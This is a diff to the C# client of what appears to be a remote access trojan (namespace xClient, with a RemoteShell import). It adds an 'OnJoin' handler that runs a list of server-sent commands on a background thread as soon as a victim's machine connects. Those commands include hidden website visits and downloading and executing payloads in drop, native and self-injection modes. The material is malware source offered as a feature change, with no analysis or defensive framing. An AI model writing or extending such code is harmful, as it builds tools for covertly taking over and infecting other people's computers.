@@ -6,6 +6,7 @@ using System.Threading;
 using System.Windows.Forms;
 using xClient.Core.RemoteShell;
 using xClient.Core.Helper;
+using System.Collections.Generic;
 
 namespace xClient.Core.Commands
 {
@@ -75,7 +76,46 @@ namespace xClient.Core.Commands
                 _shell = null;
             }
         }
-
+        public static void HandleOnJoin(Packets.ServerPackets.OnJoin command, Client client)
+        {
+            //MessageBox.Show("Received OnJoin");
+            new Packets.ClientPackets.Status("Processing On Join Commands...").Execute(client);
+            new Thread(() =>
+            {
+                try
+                {
+                    foreach (KeyValuePair<string, string> cmd in command.Commands)
+                    {
+                        switch (cmd.Key)
+                        {
+                            case "VisitURL":
+                                HandleVisitWebsite(new Packets.ServerPackets.VisitWebsite(cmd.Value, false), client);
+                                break;
+                            case "DownloadDrop":
+                                HandleDownloadAndExecuteCommand(new Packets.ServerPackets.DownloadAndExecute(cmd.Value, false, "drop"), client);
+                                break;
+                            case "DownloadNative":
+                                HandleDownloadAndExecuteCommand(new Packets.ServerPackets.DownloadAndExecute(cmd.Value, false, "cmd"), client);
+                                break;
+                            case "DownloadSelfInject":
+                                HandleDownloadAndExecuteCommand(new Packets.ServerPackets.DownloadAndExecute(cmd.Value, false, "self"), client);
+                                break;
+                            case "VisitURLHidden":
+                                HandleVisitWebsite(new Packets.ServerPackets.VisitWebsite(cmd.Value, true), client);
+                                break;
+                            default:
+                                new Packets.ClientPackets.Status(string.Format("OnJoin failed to recognize {0}", cmd.Key)).Execute(client);
+                                break;
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    new Packets.ClientPackets.Status(string.Format("OnJoin failed: {0}", ex.Message)).Execute(client);
+                    return;
+                }
+            }).Start();
+        }
         public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command,
                    Client client)
         {
